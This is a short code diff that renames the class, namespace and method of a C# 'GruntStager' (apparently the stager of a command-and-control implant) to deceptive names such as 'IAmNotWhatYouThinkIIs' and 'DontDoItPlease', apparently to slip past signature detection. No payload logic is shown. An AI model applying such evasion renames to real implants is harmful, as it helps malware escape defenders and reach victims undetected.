@@ -8,24 +8,24 @@ using System.Reflection;
 using System.Collections.Generic;
 using System.Security.Cryptography;
 
-namespace GruntStager
+namespace HereICome
 {
-    public class GruntStager
+    public class IAmNotWhatYouThinkIIs
     {
-        public GruntStager()
+        public IAmNotWhatYouThinkIIs()
         {
-            ExecuteStager();
+            DontDoItPlease();
         }
         [STAThread]
         public static void Main(string[] args)
         {
-            new GruntStager();
+            new IAmNotWhatYouThinkIIs();
         }
         public static void Execute()
         {
-            new GruntStager();
+            new IAmNotWhatYouThinkIIs();
         }
-        public void ExecuteStager()
+        public void DontDoItPlease()
         {
             try
             {
